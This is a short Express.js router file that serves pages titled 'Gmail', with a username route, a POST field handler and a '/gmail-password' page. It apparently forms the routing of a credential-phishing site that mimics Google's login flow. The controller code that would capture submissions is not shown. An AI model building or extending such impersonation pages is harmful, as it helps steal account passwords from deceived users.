const express = require('express');
const router = express.Router();

const userCtrl = require('../controllers/userCtrl');

    router

.get('/', async (req, res) => {
    res.render('index', {
        doc_title: 'Gmail'
    })
})

.get('/username', userCtrl.getUser)

.post('/userField', userCtrl.userField)

.get('/gmail-password', async (req, res) => {
    res.render('password', {
        doc_title: 'Gmail'
    })
})

module.exports = router;